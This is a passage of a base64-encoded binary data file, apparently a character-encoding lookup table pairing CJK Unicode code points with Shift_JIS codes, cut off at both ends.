cT17+k/le/5XZXwGcUF8DmE1fBJxRXwmVvl8KnFRfC5ifXwyYr18Njq5fD5PzXxCcVV8Ri3xfE5KiXxSI+F8VnFZfFpWkXxeNT18Ykm9fG5LtXx/6t18hlu1fJYy3XyaMyl8nnFdfKZxYXy2cXl8vjuNfMfq4XzSSo181i61fN5xZXziVSl88kmVfPpxaX0H6Z19FnFtfSIuuX0qcXF9MnF1fTpxfX1GTll9TnGBfVpxhX1ecYl9ZnFNfXJxSX12cY19hjGBfYpVGX2b6uV9njcpfaZVWX2qSpF9rlWpfbJxkX22Psl9wiWVfcZxlX3OcZl93lvBfeZTeX3ycaV9/iZ1fgJCqX4GcaF+CnGdfg4xhX4SR0l+FnG1fh5xrX4ical+Kl6Vfi4zjX4yPmV+QnGxfkZNrX5KPXV+Tk75fl5xwX5icb1+ZnG5fnpxxX6CM5F+hnHJfqJWcX6mPel+qnHNfrZT3X66Tv1+zkqVftPq6X7eTT1+5nHRfvItKX72QU1/DlUtfxYr1X8yURV/NnHVf1o51X9eWWV/Yllpf2YmeX9ycel/d+rtf3pKJX+Ccd1/kifVf65yrX/CceV/xlE9f9Zx4X/icdl/7jZpf/Zx8X/+cg2AOnIlgD5yBYBCTe2ASnIZgFZV8YBacgGAZnIVgG5flYByOdmAdkdNgIJx9YCGLfWAlnIhgJpCrYCeJhWAonIJgKYn2YCqch2Ari69gL5yEYDGcimA6nIxgQZyWYEKclGBDnJFgRpyQYEqX9mBLnJJgTYuwYFCNUGBSj5pgVZyZYFmci2Ba+rxgXZyPYF+cfmBgifhgYpyTYGOclWBkknBgZY2mYGiJtmBpnI1gapyYYGucl2Bsi7FgbZGnYG+KhmBwjGJgdZyOYHecmmCBnJ1gg5yfYIT6vWCFjrtgifq+YIqcpWCLku5gjJybYI2co2CSifdglJyhYJacomCXnJ5gmpygYJuM5WCfl0lgoIqzYKOJeGCmnKRgp5RZYKmIq2CqlN9gspx7YLOcqmC0nK5gtZbjYLacp2C4k4lgvJysYL2P7mDFnK1gxpPVYMeYZmDRnKlg0/rAYNWcr2DYjZtg2pDJYNz6v2DeiNJg35yoYOCcpmDhkXlg45ycYOeOU2DokcRg8Jy7YPH6wmDykXpg85y2YPScs2D2nLRg947kYPmct2D6nLpg+5y1YQCPRGEBnLhhA5yyYQaW+mEIlvlhCZy8YQ2cvWEOiNNhD/rDYRGcsWEVi/BhGoikYRuKtGEf+sFhIJy5YSGcwWEnnMBhKJzFYSz6xWEwnMZhNPrEYTecxGE8nMdhPZy/YT6cw2E/nMhhQpzJYUScvmFHjpxhSJzCYUqR1GFLjVFhTJywYU2QVGFOnNZhU5XnYVWczGFYnM1hWZzOYVqc1WFdnNRhX5adYWKKtWFjnNJhZYxkYWeKU2FonM9ha5e2YW6c0WFviNRhcJzTYXGcymFznNBhdJzXYXWMY2F2nMthd5d8YX6XSmGCnNphh5zeYYqRnmGOl/dhkJzfYZGc3GGUnNlhlvrGYZic2GGZnN1hmpWuYaSTsmGnjGVhqZzgYauc22GsnOFhroybYbKJr2G2nOlhuoq2Yb6c52HDnOhhxo2nYcec5mHInORhyZzjYcqc6mHLnOJhzJzsYc2J+WHQnO5h45ztYeaSpmHynPFh9JzvYfac5WH3jJxh+JzwYfqc9GH8nPNh/Zz1Yf6c8mH/nPZiAJz3Ygic+GIJlehiCpz6Ygyc+WINj15iDpCsYhCJ5GIRifpiEvrHYhOc+2IUiL1iFpDKYhqc/GIb5sFiHZ1AYh6MgWIfnUFiIZDtYiadQmIqnUNiLotZYi+dRGIwnUViMp1GYjOR1WI0jMtiOJbfYjuWW2I/j4piQJ1HYkGQ7mJH57tiSJTgYkmO6GJLjctiTZ1IYk6RxWJTlaViVZHvYlidS2JbnUliXp1MYmCdSmJjnU1iaJWvYm6ItWJxlX1idpThYnmdTmJ8nVFifo+zYn+LWmKAnU9igp1WYoOPtGKEnVBiiZRjYoqXfWKRnVJikp1TYpOdV2KUk4pilZ1UYpaNUmKXkNximJ1lYpuUsmKckfBinvrIYqaU4mKrnatirJX4YrGS72K1lpViuZ1aYruJn2K8kopivZ1jYsKSU2LFnV1ixp1kYsedX2LInWZiyZ1iYsqdYWLMlI9izZ1bYs+J+2LQnVli0YuRYtKR8WLTnVVi1J1YYteNU2LYkNli2Y+1YtudYGLclHFi3YuSYuCKZ2Lhiodi7JBAYu2daGLunW1i751pYvGMnWLznW5i9Y5BYvaNiWL3j0Vi/p1cYv+OnWMBnWtjAo53YwedbGMIiMJjCZ1nYwySp2MRi5NjGYuyYx+damMniKVjKI3BYyuQVWMvkvBjOpTSYz2dcGM+kX1jP5GoY0mOSmNMnXFjTZ1zY0+db2NQld9jVZK7Y1eRe2NclfljZ47MY2idgGNpnX5ja5CYY26MnmNynXhjdo+3Y3eT5mN6lFBje512Y4CRfGODjvZjiJ17Y4mPtmOMnXVjjp16Y4+UcmOSnXRjloxAY5iKfGObnXxjn5epY6CNzGOhklRjop15Y6OQ2mOljVRjp5CEY6iJhmOpkVtjqp13Y6uLZGOsjGZjspLNY7SdfWO1kX5ju52BY76dg2PAkbVjw52JY8SdhGPGnYZjyZVgY8+S8WPQnYdj0pdLY9aXZ2Pairdj24isY+GdhWPjnYJj6Yr2Y+6Jh2P0+slj9Z2IY/aXaGP6nYxkBpG5ZA2dk2QPnY1kE52KZBadkWQXnXJkHJ2OZCadkmQolMBkLJOLZC2di2Q0nY9kNoxnZDqN72Q+kNtkQp2XZE6TRWRY+spkYJ2UZGeWgGRpnZVkb52WZHaWzGR4kKBkeoyCZIOdnWSIjlRkkp2aZJOdmWSVlFFkmvrLZJ2Ts2Sek1BkpJ2bZKWdnGSplY9kq5RkZK2OQmSukO9ksJZvZLKKaGS5naNku52eZLyXaWTBnaVkwp2hZMWdomTHkYBkzfrMZM6doGTSnV5k1J2kZNidn2Tanalk4J2qZOGTRmTinaxk445DZOadp2Tni1tk7J2tZO+dpmTxnbFk8p2wZPSdr2T2nbJk+p20ZP2P72T+nbNlAJ23ZQWdtWUYnbZlHJ2QZR2duWUjnbhlJJ2YZSqdumUrna5lLI54ZS+du2U0nbxlNZ2+ZTadvWU3nb9lOIn8ZTmNVWU7lfplPpCtZT+MzGVFncFlSJ3EZU36zWVOlXFlT4t+ZVGdw2VVncJlVpRzZVedxWVYi7NlWZ3HZV2dxmVeirhlYo5VZWOT1mVmjGhlbJCUZXCdyGVykK5ldJNHZXWVfmV3nclleJ3KZYKdy2WDlbZlh5t8ZYiQxGWJlWtljI3WZY6U42WQlMFlkZNsZZeXv2WZnc1lm47OZZydzmWfiLRloYvSZaSQy2WllYBlp53PZauOYWWskmZlrY56Za+QVmWwndBlt5X7ZbmJl2W8jntlvZ3TZcGd0WXDndRlxJe3ZcWd0mXGkPlly53VZcyRsGXPndZl0or4Zded2GXZnddl253ZZeCd2mXhivll4pP6ZeWSVWXmi4xl5458ZeiRgWXpj3tl7IiuZe2d22XxiaBl+p3fZfv6zmYAjVZmAp3eZgONqWYGj7hmB/rRZgmd3WYKj7lmDJa+Zg6NqGYPiNVmE5DMZhT6z2YVneRmHPrTZh6Qr2YfiWZmIPrUZiSPdGYlloZmJ43wZiiPumYt+tJmLpClZi/6Y2YxneNmNJ3hZjWd4mY2+tBmO5KLZjyeRWY/nehmQY6eZkKNV2ZDneZmRJ3nZkmQV2ZLneVmT45OZlL61mZX+tdmWZ3qZl2d6WZene5mX53vZmKd62Zk+tVmZYpBZmad7GZnne1maJTTZmmVgWZujGlmb53wZnD62WZzkLBmdI+7ZnaScWZ6i8VmgZ3xZoOd9WaEiclmh53yZoid9GaJnfNmjo+LZpGSZ2aWiMNml532Zpj62maZnfdmnfrbZqCSqGail+9mpo5iZquV6Wau+txmspZcZrSeQWa4nflmuZ38Zryd+2a++t1mv534ZsGeQGbEk9xmx536ZsmeQmbWj4xm2Z5DZtqXambclJhm3Z5EZuCeRmbmnkdm6Z5IZvCLyGbyiWdm841YZvSeSWb1nkpm94+RZviRgmb5+t5m+vpmZvuZ1mb8kV1m/ZFcZv6R1mb/jcVnAJjwZwOMjmcIl0xnCZX8ZwuVnmcN+t9nDp5LZw+N8WcUkr1nFZ5MZxaYTmcXll1nG5KpZx2eTWceivpnH55OZyaeT2cnlthnKJaiZyqWlmcrlntnLI5EZy2eUWcujulnMZZwZzSeU2c2nlZnN55VZziK92c6i4BnPZ5SZz+eVGdBnldnRpCZZ0mXm2dOiMdnT43eZ1CRumdRjttnU4/xZ1aeWmdZk21nXJ5YZ16RqWdfnllnYI/wZ2GW22dinltnY55cZ2SXiGdl+uFnZp5hZ2qNWWdtlHRnb55eZ3CTjGdxndxncp3gZ3OLbmd1lGZnd55gZ3yPvGd+lMJnf55mZ4WU+GeHnl1niZ5jZ4ueYmeMkM1nkJaNZ5WX0WeXlodnmonKZ5yOfWedmGdnoJ5lZ6GQlWeinmRnpp5fZ6mMzWevnmtns55pZ7SJy2e2nmdnt55tZ7iec2e5+uJnu/rkZ8CRxmfBlb9nxJ51Z8aVQWfKnnRnzpSQZ8+WXmfQirln0ZD1Z9OPX2fUktFn2JdNZ9qecGfdnm9n3p5xZ+KebmfknnZn555sZ+meamfsnnJn7p5oZ++SjGfxlvZn847EZ/SN8mf1jbhn+5aPZ/6KYGf/+uVoAZLMaAKTyGgDiWhoBJDwaBOQsmgWjEloF554aB6NWmghipxoIp56aCmKlGgqnoFoK559aDKQ8Wg0impoOI2qaDmKaWg8jc1oPZ57aECMhWhBjGpoQpONaEP65mhEnnloRojEaEiefGhNnn5oTovLaFCMS2hR+uNoUoq6aFOLamhUnoJoWY33aFyWkWhdjlZoX56DaGOVT2hnno9odImxaHaehGh3npVofp6FaH+XwGiBnoxog5R+aIWelGiNnodoj4iyaJOeiWiUjVtol56LaJueimidnoZon56RaKCPvWiimutopozmaKeXnGionohorZLyaK+KQmiwjatosZ6AaLOekGi1ioFotp6OaLmekmi6k45ovIr8aMSesGjG+mRoyJbHaMmel2jKivtoy56eaM3652jPll9o0p6faNSeoWjVnqVo156ZaNiSSWjak49o356paOCenGjhnqZo456gaOeQWGjunqpo75CxaPKeqGj5irto+phvaQCelmkBnqRpBIjWaQWemGkIlrhpC56daQyQQWkNksVpDp6TaQ+eo2kSkJppGZ6taRqKkWkbjJ9pHJ6vaSGemmkinq5pI56naSWem2kmnqtpKJ6saSqevWkwk8xpNJ6iaTaeuWk5nrtpPZLWaT+Xa2lKlZZpU562aVSRyGlVnrxpWZFeaVqes2lcnsBpXZ6/aV6T7Wlgnr5pYZPoaWL66WlonsJpap61aWuLxmltnrhpbo98aW+UgGlznrppdIvJaXWesml3nrRpeJ6xaXmYT2l8inlpfZ63aX6ewWmBilRpgo3laYqJfGmOntJpkZhQaZSe1WmV+utpmJBZaZue1GmcntNpoJ7QaaeexGmunuFpsZ7DabKe1mm0ns5pu57Jab6exmm/nsdpwZ7PacPqoGnHnsxpyo1cacuSxmnMkYRpzZ7Kac6exWnQnshp05dsadiWimnZns1p3Z7Xad767Gnint9p557Yaeie5WnrnuNp7Z7eafKe3Wn5ks5p+5GFaf2e22n/ntlqAp7gagWe5moKlPNqC57sagye52oSnupqE57kahSSlGoXlVdqGZ7aahue4moej75qH5bNaiGe9moinulqI4ygaimJoWoqin5qK57Rai767Wowj79qNZ7uajae9Wo4jvdqOYqSajqSTWo9nutqRPrvakae8GpHnvRqSIu0akuLa2pYnvJqWYtAal+TyWphnvFqYp7zamb67mprnu1qcvrwanOe72p4+vFqfoqAan+SaGqAnvpqhJ74ao2M52qOnvdqkJ9Aapeed2qcnvlqoJ77aqKe/Gqjn0tqqp9HaqyejWqun0Zqs59FarifQmq7nuhqwZ9EasKfQ2rDn0lq0ZhFatOfTGrai/lq259Iat6fSmrf+vJq4vrzauSUpWron01q6p9RavqfTmr7l5NrBJ9PawWe3GsKn1JrEp9TaxaJVGsdn1VrH4yHayCOn2shi9NrI4miayeXfmsyn1drN59WazifWWs5i1xrOovUaz2KvGs+n1xrQ59ba0efXWtJicxrTJJWa06fXmtQir1rU59ga1SfX2tZn2FrW59ia1+fY2thjn5rYpCza2ONn2tklZBrZpXga2mYY2tqjpVrb43Oa3OX8Gt0n2RreJ9la3mOgGt7n2Zrf59na4CfaWuDn2hrhJZ3a4aPfWuJjuprio5ja4ufamuNn2xrlZBCa5afa2uYn21rnp9ua6Sfb2uqn3Brq59xa6+fc2uxn3Jrsp90a7OJo2u0kmlrtZ91a7eORWu6imtru592a7yTYWu/msprwItCa8Wfd2vGn3hry5Xqa82WiGvOk8Vr0p95a9OU5GvU+vRr1pT5a9iW0Wvbn3pr3598a+ufe2vsn35r7599a/OfgWwIjoFsD5avbBGfgmwTn4NsFItDbBefhGwbn4ZsI5+FbCSQhWw0lVhsN4lpbDiUw2w++vVsP5LzbECPYGxBi4FsQpTEbE6OrGxQn4hsVYq+bFeJmGxa+vZsXJPwbF2fh2xejV1sX5JybGCfiWxin5FsaJ+KbGr6+Gxvkb9scIuCbHKfkmxzjIhseotEbH2fkGx+n45sgZ+LbIKXgGyD+vdshpK+bIiT12yMn4xsjZ+UbJCfk2ySjEJsk4mrbJaNuWyZn41smp+PbJuWdmyhkfJsopaXbKufnGyun51ssYnNbLOVpmy4lvtsuZ+fbLqOoWy7j8BsvJ+YbL2fnmy+iYhsv4u1bMGflWzEn5psxZDybMmUkWzKlOVszJ+XbNOWQGzVn5ls15+ibNn6+Wzan6Bs25+bbN2WQWzhlGds4ouDbOOTRGzlko1s6J+jbOqfoWzvkdds8J+WbPGJamzz+vptBJdtbQufrm0Mn61tEpD0bRefqm0Zl4xtG5O0bR6fpG0fksNtJYlrbSmNXm0qn6dtK49GbTKfrG0zn6ttNZ+mbTafqW04iohtO5+obT2UaG0+l6xtQY/ybUSQ821Fn7RtWZ+ybVqVbG1cn69tY5+xbWSJWW1mjV9taZhRbWqKXG1slYJtbvr8bW+XgW10ikNtd5BabXifs215n7hthfr7bYePwW2Il09tjJ+1bY6fsG2Tn7ZtlftAbZaX3G2Zk5Ntm5PAbZz7QW2silVtr4l0bbKfvG21n79tuJfBbbyXhG3An8ZtxZ/AbcafvW3Hl9Jty5/Dbcz7Qm3Pj2lt0Z/FbdKfym3Vk5Ft2J/Ibdmfwm3ekldt4Z/JbeSfvm3mn8Rt6J/LbeqI+m3rn8Ft7J/Mbe6QW23x+0Rt8o9+bfOVo231jaxt9/tDbfifuW35n8dt+pNZbfv7RW38kLRuBYqJbgeNz24Ij8JuCZ+7bgqPYW4LjGtuE5+6bhWf0G4Zj41uGoy4bhuf324dn9luH4uUbiCTbm4hn9RuI5/dbiSIrW4liVFuJvtIbieJt24pn9ZuK5GqbiyfzW4tn89uLo1gbi+f4G44+0ZuOZ/bbjr7SW48n9NuPp/abkOWqW5Kn9huTZ/cbk6Mzm5Wj8NuWJJYblv7R25cn9JuX5dObmef1W5rn85ubpOSbm+f0W5yn9dudphwbn6OvG5/lp5ugJ/hboKUrG6Mn+1uj4y5bpCPgG6Wn+NumJetbpyNYW6dn/Bun4jsbqKf7m6ln+Juqp/obq+f6m6yl25utp/lbreTTW66n+duvftKbr+f727Cn+luxJbFbsWf5G7JjqBuy5/8bsyKim7Rn+Zu05/rbtSf7G7Vkepu3ZHYbt6f9G7sn/pu75/4bvKTSG704EJu95/1bvif9m7+n95u/4uZbwGVWW8Cjr1vBo2XbwmYUm8Pn/JvEeBBbxOJiW8UkYZvFZSZbyCKv28il/hvI5afbyuS0G8sn/lvMZ/7bzKRUW844EBvPp/3bz+f8W9BisFvRYyJb1TgTm9Y4ElvW5D2b1yKg29fj4FvZOBSb2bgS29tkqpvbuBIb2+S129w4GtvdOBFb3jgRG964E1vfOBHb4DgRm+B4ExvgpCfb4TgQ2+G+0tviOBPb47gUG+RisBvl+BVb6HgVG+j4FZvpOBZb6q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I6Xjv4kN49OJCeP2PynkB4kR5B5FieQ7iRnkR4kV5EuJHeRnh5nkm4eh5KuJJeSviSHks+3x5MI6meTqX53k8jtB5PuJKeUCMVnlBi195R4tGeUiOg3lJl1N5UOJQeVPiT3lVkWN5VuJMeVfiTnlaj2p5XZBfeV7iTXlf4kt5YJRJeWKPy3lllVt5aI3VeW2TmHl34lF5euJSeX/iaHmAi9Z5gZhceYSRVHmF4lN5ionQeY2S9XmOlZ95j/uBeZT7g3mb4lR5nYuaeabiVXmn4ld5quJYea6USHmw4ll5s+JaebniW3m6i9d5vYnReb6Tw3m/j0d5wI6EecHiXHnJj0h5y4nIedGVYnnS4l151ZTpediRZHnf4mB54eJheeOUiXnkkGB55uJeeeeSgXnp4l957I/MefCI2nn7i0h6AOJiegiS9noL4mN6DZDFeg6Wq3oUlUJ6F+JkehjiZXoZknR6GpfFehziZ3of4mZ6II7tei7iaXoxiO56MuJsejfiano7idJ6PIxtej3ia3o+jWV6P42SekCV5HpC4m16Q5Zzekbib3pJkM96TYluek6JuHpPiKp6UOJuelficHph4nF6Yo/1emPicnppim56a+J0enCMinp0i4Z6duJ1enmL83p64nZ6fZD6en+Ty3qBkN56g43zeoTid3qIkoJ6kpGLepPieXqV4nt6luJ4epfienqYjEF6n+J8eqmMRXqqi4d6rpdxeq/ifnqw4oB6tolNerrig3q/ipZ6w+KCesTigXrF4oV6x+J9esjihnrKl6d6y+KHes3iiHrP+4R60ZryetLiinrT4ol61eKLetnijHral7N63OKNet3o7Xrfj8164OKOeuHij3rij3Z645O2euXikHrm+4V655JHeur7h3rr4pF67ZJbeu/iknrwi6N69pleeviSfHr5jrF6+orGev/ik3sC4qB7BOKWewaLiHsI4pV7CuKiewvilHsPj857EeKYexjimXsZk0p7G+Kaex6KfXsgkHl7JZWEeybinHsokeZ7LOKXezPim3s14p17No35eznipHtFlU17RpSke0iTmXtJi9h7S+Kje0zioXtNlLN7T+Kee1CSfXtRk5t7UpOae1SN9HtW4rZ7XeKme2XiqHtn4qt7bOKse27iqXtw4qp7ceKne3TipXt14p97epXNe4aJ03uH4rN7i+Kwe43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